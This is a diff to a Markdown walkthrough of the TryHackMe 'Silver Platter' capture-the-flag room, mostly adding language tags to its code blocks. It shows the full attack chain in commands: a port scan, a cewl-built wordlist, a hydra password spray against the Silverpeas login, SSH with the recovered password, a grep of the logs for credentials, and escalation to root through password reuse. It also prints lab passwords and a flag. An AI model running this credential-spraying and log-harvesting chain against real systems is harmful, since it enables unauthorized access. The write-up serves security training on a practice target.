@@ -34,7 +34,7 @@ When you look at my solution, do not get discouraged because you fear you would 
 ### Action
 Do not forget to move to the **/tmp** directory:
 
-```
+```bash
 ┌──(username㉿machinename)-[~]
 └─$ cd /tmp
 ┌──(username㉿machinename)-[/tmp]
@@ -48,7 +48,7 @@ This way when we download something or try to output a new file, we will not get
 # Port Scanning
 We start with port scanning, that normally means using nmap; in fact, we are going to use nmap *indirectly* via rustscan because rustscan is fast, and we like not having to wait too long; this and other outputs can be quite long, so for the sake of this document, we are going to cut all outputs down to their essential parts:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ rustscan -a 10.10.160.74 -- -A
 
@@ -70,7 +70,7 @@ From the TRACEROUTE section we see that the domain name is **silverplatter.thm**
 The file **/etc/hosts** works as a sort of local DNS by mapping domain names to IP addresses.
 We add both the domain and the IPv4 address to the /etc/hosts file, so we will be better able to reuse our CLI commands even if the IP address of the VM changes (for instance, because the VM's timeout expires), so inside the **/etc/hosts** file we add this line:
 
-```
+```text
 10.10.105.52    silverplatter.thm
 ```
 
@@ -79,7 +79,7 @@ Of course, every time the IP address changes, we will have to keep updating it i
 ### Action
 Let's verify that **/etc/hosts** works by trying to ping silverplatter.thm:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ ping silverplatter.thm
 PING silverplatter.thm (10.10.105.52) 56(84) bytes of data.
@@ -100,7 +100,7 @@ Not all CLI commands support converting the domain names in **/etc/hosts** so wi
 # Our Strategy
 From the output of rustscan/nmap we know that there are 3 ports:
 
-```
+```text
 PORT     STATE SERVICE    REASON         VERSION
 22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
 80/tcp   open  http       syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
@@ -183,7 +183,7 @@ Since we know about a user named scr1ptkiddy for a Silverpeas server running on 
 
 Here is the command to scan the web site and collect all its keywords in a file named **silverplatter_keywords.txt**:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ cewl http://silverplatter.thm > silverplatter_keywords.txt
 ```
@@ -195,13 +195,15 @@ Important details:
 
 Optional improvements if the default wordlist doesn't work:
 
-```
+```bash
 # Include shorter words (minimum 2 characters) using the -m option
-cewl -m 2 http://silverplatter.thm > silverplatter_keywords_short.txt
+┌──(kali㉿kali)-[/tmp]
+└─$ cewl -m 2 http://silverplatter.thm > silverplatter_keywords_short.txt
 
 # Include words that contain numbers (like "admin123") using the --with-numbers option
 # (without --with-numbers: a word like "admin123" would be ignored)
-cewl --with-numbers http://silverplatter.thm > silverplatter_keywords_nums.txt
+┌──(kali㉿kali)-[/tmp]
+└─$ cewl --with-numbers http://silverplatter.thm > silverplatter_keywords_nums.txt
 ```
 
 The 2 commands above would respectively add:
@@ -217,18 +219,22 @@ We are going to use hydra to *password spray* all the keywords in **silverplatte
 #### hydra requires several parameters
 First, we check the form's action attribute to find the real target for hydra:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ curl -s http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp | grep -i "action="
+```
+```html
 <form id="formLogin" action="/silverpeas/AuthenticationServlet" method="post" accept-charset="UTF-8">
 ```
 Notice that the curl command takes /silverpeas/defaultLogin.jsp as input, because it is a GET request to the login page we see in our web browser: we are reading the login page to understand its structure and the page defaultLogin.jsp contains the form definition. The returned action attribute uses /silverpeas/AuthenticationServlet that is the backend endpoint that actually processes the login request: this backend endpoint is what we will eventually pass to hydra, because hydra will be submitting a POST request to the actual processing endpoint.
 
 Second, we run this command to learn more about how to authenticate with Silverpeas:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ curl -s http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp | grep -E 'name=|type="password"|type="text"
+```
+```html
   <meta name="viewport" content="initial-scale=1.0"/>'
           <label><span>Login</span><input type="text" name="Login" id="Login"/></label>
           <label><span>Password</span><input type="password" name="Password" id="Password" autocomplete="off"/></label>
@@ -242,7 +248,7 @@ Third, we also need to identify a pattern in the Silverpeas’ response that all
 
 (btw, wouldn't it be funny if - after innocently running it - we realized that 'wrongpassword' is the correct password..?!)
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ curl -v -d "Login=scr1ptkiddy&Password=wrongpassword&DomainId=0" http://silverplatter.thm:8080/silverpeas/AuthenticationServlet
 ...
@@ -255,7 +261,7 @@ From the above, we see that **ErrorCode=1** appears in Silverpeas' responses whe
 
 So, putting all of the above together (plus the fact that 8080 is the appropriate port number to pass to hydra), we get to finally write this hydra command:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ hydra -l scr1ptkiddy -P silverplatter_keywords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:ErrorCode=1"
 ...
@@ -323,7 +329,7 @@ So now we know two users with their respective passwords:
 ## 22/tcp (ssh) OpenSSH 8.9p1 [part 2]
 Now that we know tim's ssh password, we can finally use it to login to our target machine:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ ssh tim@silverplatter.thm # Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -348,7 +354,7 @@ When we try to connect again, SSH compares the current fingerprint with the stor
 
 Normally, this would be a concern, and on a production machine we would better ask the system administrator whether things are fine, but since this is a virtual machine we are connecting to, and it is pretty common for servers to be rebuilt/reinstalled in VM environments, we can safely proceed issuing the command the warning above suggests; this command removes the old fingerprint of silverplatter.thm from the known_hosts file:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R 'silverplatter.thm'
 # Host silverplatter.thm found: line 1
@@ -360,7 +366,7 @@ Original contents retained as /home/kali/.ssh/known_hosts.old
 
 Now, we can try to ssh again into our target machine that will prompt us to accept the new fingerprint:
 
-```
+```bash
 ┌──(kali㉿kali)-[/tmp]
 └─$ ssh tim@silverplatter.thm # Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 The authenticity of host 'silverplatter.thm (10.10.30.149)' can't be established.
@@ -375,7 +381,7 @@ tim@ip-10-10-30-149:~$
 
 Yuppy, we are finally in! And we can get the user's flag too :)
 
-```
+```bash
 tim@ip-10-10-30-149:~$ whoami
 tim
 tim@ip-10-10-30-149:~$ ls -la
@@ -390,7 +396,7 @@ THM{c4ca4238a0b923820dcc509a6f75849b}
 Notice how tim's home is owned by root, and cannot write in his own home!
 This is one good reason to move to a directory like **/tmp** where most users have write access:
 
-```
+```bash
 tim@ip-10-10-30-149:~$ cd /tmp
 tim@ip-10-10-30-149:/tmp$ ls -lad
 drwxrwxrwt 12 root root 4096 Jul 23 01:24 .
@@ -408,7 +414,7 @@ We start by typing a few commands to explore the users on our target machine and
 ## id
 tim is part of the adm group, that means he has access to log files:
 
-```
+```bash
 tim@silver-platter:~$ id
 uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ```
@@ -416,7 +422,7 @@ uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
 ## sudo -l
 But tim is not part of the sudo group, hence tim cannot run sudo:
 
-```
+```bash
 tim@silver-platter:~$ sudo -l    # cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
 [sudo] password for tim: 
 Sorry, user tim may not run sudo on silver-platter.
@@ -425,7 +431,7 @@ Sorry, user tim may not run sudo on silver-platter.
 ## Users
 We can look for more users on this machine:
 
-```
+```bash
 tim@ip-10-10-30-149:/tmp$ ls -la /home
 total 24
 drwxr-xr-x  6 root     root     4096 Jul 21 20:10 .
@@ -440,7 +446,7 @@ ls: cannot open directory '/home/tyler': Permission denied
 
 It appears that there is a new user named tyler, so we look for what groups tyler belongs to:
 
-```
+```bash
 tim@silver-platter:~$ id tyler
 uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
 ```
@@ -452,7 +458,7 @@ Important groups:
 ## Check Logs
 User tyler might be the intended escalation path, or there might be information in the logs about tyler's activities, either way, since for the time being we are still tim and we are part of adm, we can check the logs looking for more information:
 
-```
+```bash
 ## Check Log Files for tyler Activity
 
 # Look for tyler in authentication logs
@@ -517,7 +523,7 @@ Since tyler has sudo privileges and can become root, we need to find a way to ei
 
 ## tyler’s password
 
-```
+```bash
 # Look for tyler's password in logs or config files
 grep -r "tyler" /var/log/ 2>/dev/null | grep -i "password\|passwd"
 
@@ -541,7 +547,7 @@ Key Findings:
 
 When we find a password for a user, it is always a good idea to check whether such user did password reuse: for instance, in this case, we are hoping that tyler reused the same password for PostgresSQL as for his ssh account:
 
-```
+```bash
 # Let's hope that tyler reused the same password he also used for the database
 tim@silver-platter:~$ su tyler    # _Zd_zx7N823/
 Password: 
@@ -553,7 +559,7 @@ It worked, we are tyler!
 
 Now, we can simply use tyler’s password _Zd_zx7N823/ to **sudo -i** our way into becoming root:
 
-```
+```bash
 tyler@silver-platter:~$ id
 uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
 tyler@silver-platter:/home/tim$ sudo -i    # _Zd_zx7N823/
